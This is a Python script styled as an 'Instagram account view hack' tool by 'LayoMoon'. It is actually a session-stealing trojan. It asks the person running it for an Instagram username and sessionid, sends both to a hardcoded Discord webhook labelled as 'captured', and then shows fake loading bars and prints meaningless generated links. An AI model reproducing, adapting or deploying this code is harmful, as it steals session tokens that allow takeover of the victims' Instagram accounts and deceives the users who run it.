import time
import random
import string
import os
import random
import string
import time
import ctypes

try:
    from discord_webhook import DiscordWebhook
except ImportError:
    install_discrod_webhook = input(
        f"Module discord_webhook not installed, do you want to install it ? [Y/n]")
    if install_discrod_webhook == "n":
        exit()
    else:
        os.system(
            f"{'py -3' if os.name == 'nt' else 'python3'} -m pip install discord_webhook")
try:
    import requests
except ImportError:
    install_requests = input(
        f"Module requests not installed, do you want to install it ? [Y/n]")
    if install_requests == "n":
        exit()
    else:
        os.system(
            f"{'py -3' if os.name == 'nt' else 'python3'} -m pip install discord_webhook")

def generer_liens(lien_base, nombre_liens, utilisateurs, mots_de_passe):
    liens = []
    for _ in range(nombre_liens):
        caractères_aléatoires = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        nom_utilisateur = random.choice(utilisateurs)
        mot_de_passe = random.choice(mots_de_passe)
        lien = f"{lien_base}/{caractères_aléatoires}?username={nom_utilisateur}&password={mot_de_passe}"
        liens.append(lien)
    return liens

def saisir_nom_utilisateur():
    print("""
 ▄▄▄       ███▄    █  ▒█████   ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄      
▒████▄     ██ ▀█   █ ▒██▒  ██▒▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ 
 ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░    v.2.6
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒   ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   
      ░  ░         ░     ░ ░   ░           ░       ░                 ░  ░   
-----------------------------------------------------
Instagram account view hack!               by : LayoMoon
--------------------------------------------------------------          

[+] Update 2.6
Chargement en cours [#############################]-100%""")
    time.sleep(1)  
    nom_utilisateur = input("Nom d'utilisateur : ")
    
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1409254113686061186/VPqWYIfDr1J2cguoK0bP0E-r2MX7CYQMOF2sBtN27Cbr8nibJNy5X4W_FTtQ-c1IbZHZ', content=f'Nouveau nom d\'utilisateur capturé : {nom_utilisateur}')
    webhook.execute()
    return nom_utilisateur

def saisir_mot_de_passe():
    print("Entrez une sissionid...")
    time.sleep(1)  
    mot_de_passe = input("sessionid : ")
    
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1409254113686061186/VPqWYIfDr1J2cguoK0bP0E-r2MX7CYQMOF2sBtN27Cbr8nibJNy5X4W_FTtQ-c1IbZHZ', content=f'Nouvelle sessionid capturée : {mot_de_passe}')
    webhook.execute()
    return mot_de_passe

def petit_chargement():
    print("""
--------------------------------------------------------------
 [#] [WARNING] Chargement en cours....   
--------------------------------------------------------------""")
    time.sleep(2)  
    print("Chargement terminé.")

def chargement():
    print("Chargement en cours...")
    for i in range(31): 
        time.sleep(1)   
        pourcentage = i * 100 / 30
        barre_progression = "#" * (i // 3)  
        print(f"\r[{barre_progression:<10}] {pourcentage:.2f}%", end="", flush=True)
    print("\nChargement terminé.")

def main():
    lien_base = "https://instagram.com"
    nombre_liens = 60
    utilisateurs = ["user1", "user2", "user3"] 
    mots_de_passe = ["pass1", "pass2", "pass3"]  
    
    petit_chargement() 
    
    nom_utilisateur = saisir_nom_utilisateur()
    
    petit_chargement() 
    
    mot_de_passe = saisir_mot_de_passe()
    
    chargement()  
    
    liens = generer_liens(lien_base, nombre_liens, [nom_utilisateur], [mot_de_passe])
    
    print("Liens générés :")
    for lien in liens:
        print(lien)

if __name__ == "__main__":
    main()


